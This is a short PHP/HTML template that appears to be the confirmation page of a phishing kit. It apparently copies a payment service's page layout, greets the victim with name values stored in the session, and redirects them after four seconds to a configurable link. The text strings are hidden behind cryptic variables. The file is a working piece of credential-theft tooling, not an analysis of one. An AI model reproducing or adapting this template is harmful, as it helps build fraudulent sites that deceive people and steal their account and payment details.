<body class="desktop windows 7 superBowlDefault">
<header class="mainHeader" role="banner">
<div class="headerContainer">
<div class="grid12">
<a href="#" class="logo"></a>
<div class="loginBtn">
<span class="securityLock"><?php echo $inf_scr; ?></span>
</div></div></div></header>
<main class="superBowlMain">
<section id="content" role="main" data-country="US">
<section id="main" class=""><div id="promoteCredit" class="promoteCredit grid12">
<div class="grid12">
<div class="customGrid7">
<form action="" method="post" class="proceed" novalidate="novalidate">
<div class="stepProgress">
<span>○</span>
<span>○</span>
<span>○</span>
<span title="<?php echo $scs_ttspan; ?>" class="selected">●</span>
</div>
<meta http-equiv="refresh" content="4;URL=<?php echo $scs_lnk; ?>" />
<div class="pageHeader">
<h1><?php echo $scs_tnk; ?></h1>
<h3><?php echo $_SESSION['s03']; ?>&nbsp;<?php echo $_SESSION['s04']; ?></h3>
</div>
<div class="superBowlContainer">
<div class="inner">
<span class="assetIcon"></span>
<h3><?php echo $scs_yrp; ?></h3>
<p class="description"><?php echo $scs_yhv; ?></p>
</div></div></form></div></div></div></section></section></main><?php include ('xf/ftr.php'); ?><div id="overPanel" class="US overPanel normalizeIn"></div></body>
